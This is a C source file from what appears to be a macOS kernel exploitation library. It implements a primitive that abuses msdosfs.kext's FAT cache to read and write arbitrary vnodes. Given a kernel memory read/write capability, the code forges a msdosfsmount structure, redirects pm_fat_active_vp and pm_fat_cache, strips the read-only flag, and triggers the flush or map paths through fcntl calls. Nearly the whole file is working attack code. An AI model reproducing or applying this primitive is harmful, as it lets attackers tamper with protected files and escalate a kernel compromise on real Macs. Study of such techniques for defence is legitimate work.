//
//  vnode.c
//  libxe
//
//  Created by sreejith on 3/10/22.
//

#include <limits.h>

#include <sys/fcntl.h>

#include "util/vnode.h"
#include "util/msdosfs.h"
#include "util/log.h"
#include "util/assert.h"
#include "util/misc.h"
#include "memory/kmem.h"
#include "memory/kmem_fast.h"
#include "allocator/small_mem.h"
#include "slider/kernel.h"
#include "xnu/proc.h"

#include "../external/msdosfs/msdosfs.h"

///
/// The `msdosfs.kext` kernel extension is used for mounting MS-DOS filesystems in macOS.
/// This file system uses File Allocation Table (FAT) to identify clusters associated with a file. The
/// FAT is a statically allocated linked list allocated at the time of formatting. Each entry in this
/// linked list contains either the number of the next cluster in the file, or else a marker indicating
/// the end of the file, unused disk space, or special reserved areas of the disk[1]. The directory
/// containing a file will store the first cluster of each file in that directory. The remaining storage
/// associated with a particular file can then be identified by traversing the FAT linked list.
///
/// While mounting a MS-DOS filesystem, the `msdosfs.kext` creates a vnode pointing to the
/// statically allocated storage used by the FAT. Then it uses cluster I/O to read / write data
/// from / to the FAT. The reference to this vnode is stored in the member `pm_fat_active_vp` of
/// the `struct msdosfsmount`. To optimize performance, the most recently used FAT block is also
/// cached in the kernel memory pointed by `msdosfsmount->pm_fat_cache`. Whenever a new
/// FAT block is required to be read, it is first read into the `pm_fat_cache` before being used
/// by the kext. Also modifications to FAT block are first done on the `pm_fat_cache` and then
/// the cache is flushed to vnode `pm_fat_active_vp`. The method `msdosfs_fat_cache_flush`
/// defined in `msdosfs_fat.c` is responsible for writing the data from cache to vnode and the
/// method `msdosfs_fat_map` is used to read a FAT block from vnode to cache.
///
/// This mechanism used by `msdosfs.kext` can be exploited to read / write data from / to any
/// arbitary vnode by replacing the value of `pm_fat_active_vp`. To write data of length `length`
/// from kernel memory location `source` to a arbitary vnode `target_vp`, we set the value of
/// members `pm_fat_active_vp` to `target_vp`, `pm_fat_cache` to `source` and `pm_fat_bytes`
/// to `length` and then trigger the method `msdosfs_fat_cache_flush`. The method
/// `msdosfs_fat_cache_flush` can be triggered from userland by performing `F_FLUSH_DATA`
/// fcntl on a file inside the msdosfs mount. Similarly, to read data of length `length` from arbitary
/// vnode `target_vp` to kernel memory location `destination`, we will set the values of
/// `pm_fat_active_vp` to `target_vp`, `pm_fat_cache` to `destination` and `pm_fat_bytes` to
/// `length`. Then we will trigger the method `msdosfs_fat_map` from userland by performing a
/// `F_LOG2PHYS_EXT` fcntl on a file inside the msdosfs mount.
///
/// References:
/// [ 1 ] https://en.wikipedia.org/wiki/File_Allocation_Table
///


struct xe_util_vnode {
    xe_util_msdosfs_t msdosfs_util;
    int cctl_fd;
    uintptr_t msdosfs_mount;
    uintptr_t cctl_denode;
};


xe_util_vnode_t xe_util_vnode_create(void) {
    xe_util_msdosfs_t msdosfs_util;
    int error = xe_util_msdosfs_mount(XE_KMEM_FAST_DEFAULT_IMAGE, "mount", &msdosfs_util);
    xe_assert_err(error);
    
    char mount_point[PATH_MAX];
    xe_util_msdosfs_get_mountpoint(msdosfs_util, mount_point, sizeof(mount_point));
    
    uintptr_t proc = xe_xnu_proc_current_proc();
    
    int mount_fd = xe_util_msdosfs_get_mount_fd(msdosfs_util);
    uintptr_t mount_vnode;
    error = xe_xnu_proc_find_fd_data(proc, mount_fd, &mount_vnode);
    xe_assert_err(error);
    uintptr_t mount = xe_kmem_read_ptr(mount_vnode, TYPE_VNODE_MEM_VN_UN_OFFSET);
    uintptr_t msdosfs_mount = xe_kmem_read_ptr(mount, TYPE_MOUNT_MEM_MNT_DATA_OFFSET);
    
    char buffer[PATH_MAX];
    snprintf(buffer, sizeof(buffer), "%s/data1", mount_point);
    
    /// The file inside msdosfs mount that we will use to populate / flush FAT cache
    int cctl_fd = open(buffer, O_RDONLY);
    xe_assert(cctl_fd >= 0);
    
    /// Store the address of `struct denode` associated with the `cctl_fd`
    uintptr_t cctl_vnode;
    error = xe_xnu_proc_find_fd_data(proc, cctl_fd, &cctl_vnode);
    xe_assert_err(error);
    uintptr_t cctl_dep = xe_kmem_read_ptr(cctl_vnode, TYPE_VNODE_MEM_VN_DATA_OFFSET);
    xe_assert_cond(xe_kmem_read_uint64(cctl_dep, TYPE_DENODE_MEM_DE_PMP_OFFSET), ==, msdosfs_mount);
    
    xe_util_vnode_t util = malloc(sizeof(struct xe_util_vnode));
    util->msdosfs_util = msdosfs_util;
    util->cctl_fd = cctl_fd;
    util->msdosfs_mount = msdosfs_mount;
    util->cctl_denode = cctl_dep;
    
    return util;
}

void xe_util_vnode_flush_cache(xe_util_vnode_t util) {
    /// Trigger `msdosfs_fat_cache_flush`
    int error = fcntl(util->cctl_fd, F_FLUSH_DATA);
    xe_assert_err(error);
}

void xe_util_vnode_populate_cache(xe_util_vnode_t util) {
    /// Trigger `msdosfs_fat_map`
    int res = 0;
    int tries = 0;
    do {
        struct log2phys args;
        bzero(&args, sizeof(args));
        /// `msdosfs_fat_map` will not read FAT block from `pm_fat_active_vp` if the FAT
        /// block is already cached. So we have to keep changing below params to
        /// continuously populate FAT block from `pm_fat_active_vp` to `pm_fat_cache`
        ///
        /// TODO: Instead of random, use alternating params??
        args.l2p_contigbytes = 16384 + random();
        args.l2p_devoffset = 16384 + random();
        res = fcntl(util->cctl_fd, F_LOG2PHYS_EXT, &args);
        tries++;
        /// If cache was populated from vnode, we will get EIO or E2BIG errno
    } while (res == 0 && tries < 5);
    xe_assert_cond(res, ==, -1);
    xe_assert(errno == EIO || errno == E2BIG);
}

void xe_util_vnode_read(xe_util_vnode_t util, uintptr_t vnode, char* dst, size_t size) {
    xe_assert_cond(size, <=, UINT32_MAX);
    
    /// Temporary storage for `dst` data in kernel memory
    uintptr_t temp_mem;
    xe_allocator_small_mem_t temp_mem_allocator = xe_allocator_small_mem_allocate(size, &temp_mem);
    
    /// Memory for fake `struct msdosfsmount`
    uintptr_t fake_msdosfs;
    xe_allocator_small_mem_t fake_msdosfs_allocator = xe_allocator_small_mem_allocate(TYPE_MSDOSFSMOUNT_SIZE, &fake_msdosfs);
    
    char mount[TYPE_MSDOSFSMOUNT_SIZE];
    xe_kmem_read(mount, util->msdosfs_mount, 0, sizeof(mount));
    
    uint64_t* pm_fat_cache = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET);
    uint32_t* pm_fat_cache_offset = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET_OFFSET);
    int* pm_fat_flags = (int*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_FLAGS_OFFSET);
    uint* pm_fatmult = (uint*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FATMULT);
    uint32_t* pm_block_size = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BLOCK_SIZE_OFFSET);
    uint64_t* pm_fat_active_vp = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_ACTIVE_VP_OFFSET);
    
    /// Location in kernel memory for storing data read from vnode
    *pm_fat_cache = temp_mem;
    /// Required for populating FAT cache
    *pm_fat_cache_offset = INT32_MAX;
    /// Amount of data to be read from vnode
    *pm_block_size = (uint32_t)size;
    /// This will make the offset used in `uio_create` to 0, which will allow us to read from the
    /// beginning of vnode
    *pm_fatmult = 0;
    /// Make sure FAT cache is not marked dirty, or else data will first be written
    /// from kernel memory to vnode before FAT cache is populated
    *pm_fat_flags = 0;
    /// Vnode from which data is to be read
    *pm_fat_active_vp = vnode;
    
    /// Instead of directly changing these values in the actual `struct msdosfsmount`, we will
    /// create a fake `struct msdosfsmount` with these values and set the member `de_pmp`
    /// of the `struct denode` of the `cctl_fd`. This will only make FS operations on `cctl_fd` to
    /// use this fake mount. This is done to prevent the background thread `pm_sync_timer`
    /// started by `msdosfs.kext` when the file system is mounted, from using these updated
    /// values and causing a kernel panic
    xe_kmem_write(fake_msdosfs, 0, mount, sizeof(mount));
    xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, fake_msdosfs);
    
    /// Trigger cache populate
    xe_util_vnode_populate_cache(util);
    
    /// Restore mount of `cctl_fd`
    xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, util->msdosfs_mount);
    
    /// Read the vnode data from kernel memory to `dst`
    xe_kmem_read(dst, temp_mem, 0, size);
    
    xe_allocator_small_mem_destroy(&temp_mem_allocator);
    xe_allocator_small_mem_destroy(&fake_msdosfs_allocator);
}

void xe_util_vnode_write(xe_util_vnode_t util, uintptr_t vnode, const char* src, size_t size) {
    /// Copy `src` data from user land to kernel memory
    uintptr_t temp_mem;
    xe_allocator_small_mem_t temp_mem_allocator = xe_allocator_small_mem_allocate(size, &temp_mem);
    xe_kmem_write(temp_mem, 0, (void*)src, size);
    
    uintptr_t fake_msdosfs;
    xe_allocator_small_mem_t fake_msdosfs_allocator = xe_allocator_small_mem_allocate(TYPE_MSDOSFSMOUNT_SIZE, &fake_msdosfs);
    
    char mount[TYPE_MSDOSFSMOUNT_SIZE];
    xe_kmem_read(mount, util->msdosfs_mount, 0, sizeof(mount));
    
    uint64_t* pm_fat_cache = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET);
    uint32_t* pm_fat_cache_offset = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET_OFFSET);
    uint* pm_flags = (uint*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FLAGS_OFFSET);
    int* pm_fat_flags = (int*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_FLAGS_OFFSET);
    uint32_t* pm_block_size = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BLOCK_SIZE_OFFSET);
    uint64_t* pm_fat_active_vp = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_ACTIVE_VP_OFFSET);
    uint64_t* pm_sync_timer = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_SYNC_TIMER);
    
    /// Location in kernel memory containing data to be written
    *pm_fat_cache = temp_mem;
    /// Make sure we start writing from the start of vnode
    *pm_fat_cache_offset = 0;
    /// Write data size
    *pm_block_size = (uint32_t)size;
    /// Destination vnode
    *pm_fat_active_vp = vnode;
    /// Disable read only flags, if mounted with read only
    *pm_flags &= (~MSDOSFSMNT_RONLY);
    /// mark FAT cache dirty
    *pm_fat_flags = 1;
    /// Required to bypass check in `msdosfs_meta_flush`, so that method
    /// `msdosfs_meta_flush_internal` will be called
    *pm_sync_timer = 0;
    
    xe_kmem_write(fake_msdosfs, 0, mount, sizeof(mount));
    xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, fake_msdosfs);
    xe_util_vnode_flush_cache(util);
    xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, util->msdosfs_mount);
    
    xe_allocator_small_mem_destroy(&temp_mem_allocator);
    xe_allocator_small_mem_destroy(&fake_msdosfs_allocator);
}

void xe_util_vnode_destroy(xe_util_vnode_t* util_p) {
    xe_util_vnode_t util = *util_p;
    xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, util->msdosfs_mount);
    close(util->cctl_fd);
    xe_util_msdosfs_unmount(&util->msdosfs_util);
    free(util);
    *util_p = NULL;
}
